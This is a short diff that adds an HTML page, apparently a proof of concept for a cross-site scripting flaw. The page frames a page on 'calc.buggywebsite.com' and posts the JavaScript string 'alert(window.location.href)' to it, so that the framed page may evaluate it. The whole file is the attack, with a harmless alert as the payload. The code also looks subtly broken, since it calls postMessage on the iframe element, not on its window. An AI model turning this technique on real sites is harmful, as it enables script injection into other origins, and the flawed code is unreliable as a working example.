@@ -1,0 +1,12 @@
+<html>
+<body>
+<p>iframe below</p>
+				<iframe id="f" style="height:65px;width:100%; left:-100px; margin-top:-05px;margin-bottom:-30px;" frameBorder="0" src="http://calc.buggywebsite.com/frame.html"></iframe>
+<p>iframe above</p>
+<script>
+const iframe = document.getElementById('f');
+	iframe.postMessage('alert(window.location.href)');
+
+</script>
+</body>
+</html>
